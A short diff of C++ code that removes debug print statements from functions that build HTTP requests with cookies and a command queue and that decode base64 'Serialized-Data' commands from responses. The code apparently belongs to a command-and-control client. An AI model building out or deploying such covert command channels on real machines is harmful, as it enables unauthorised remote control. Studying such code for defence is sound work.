@@ -88,7 +88,6 @@ void to_json(json& j, const Queue& q) {
 
 std::string buildRequest(const std::string& path, const std::string& host, const std::string& cookies, CommandQueue& queue) {
     if (!queue.empty()) {
-        std::cout << "Queue" << std::endl;
         auto it = queue.begin(); 
 
         // Accessing the first element using the iterator
@@ -97,11 +96,7 @@ std::string buildRequest(const std::string& path, const std::string& host, const
         std::string cmdGroup = queueElement.Group;
         std::string cmdString = queueElement.String;
         std::string cmdResponse = queueElement.Response;
-        /*
-        std::cout << "Group: " << cmdGroup << std::endl;
-        std::cout << "Sring: " << cmdString << std::endl;
-        std::cout << "Response: " << cmdResponse << std::endl;
-        */
+
         // Create Message structure
         cmdStruct msg;
         msg.Group = cmdGroup;
@@ -223,7 +218,6 @@ std::string extractCMD(const std::vector<char>& data) {
             if (pos != std::string::npos) {
                 pos += strlen("Serialized-Data:"); 
                 base64_str = line.substr(pos); // Extract the substring after "Serialized-Data:"
-                std::cout << "Base64 string found: " << base64_str << std::endl; // Debug output
                 break; // Exit the loop since we found what we needed
             }
         }
@@ -241,7 +235,6 @@ std::string extractCMD(const std::vector<char>& data) {
             cmdString = jsonResponse["String"];
  
         } catch (const std::invalid_argument& e) {
-            std::cout << "2" << std::endl;
             std::cerr << "Error decoding base64: " << e.what() << std::endl;
             // Handle error
         }
